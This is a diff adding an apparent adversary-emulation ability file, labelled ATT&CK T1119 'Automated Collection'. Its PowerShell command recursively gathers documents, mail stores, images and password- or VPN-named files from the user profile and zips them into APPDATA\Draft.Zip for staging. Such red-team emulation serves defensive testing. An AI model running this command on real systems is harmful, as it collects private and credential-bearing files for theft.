@@ -1,0 +1,50 @@
+ability_id: 5692da31-3586-4e4f-8f07-5750070c730b
+access: {}
+additional_info: {}
+buckets:
+- collection
+delete_payload: true
+description: Execute PowerShell from cmd.exe to collect and compress files of specific
+  extensions.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk
+    -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive
+    -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip
+    -Force
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk
+    -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive
+    -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip
+    -Force
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Automated Collection
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: collection
+technique_id: T1119
+technique_name: Automated Collection
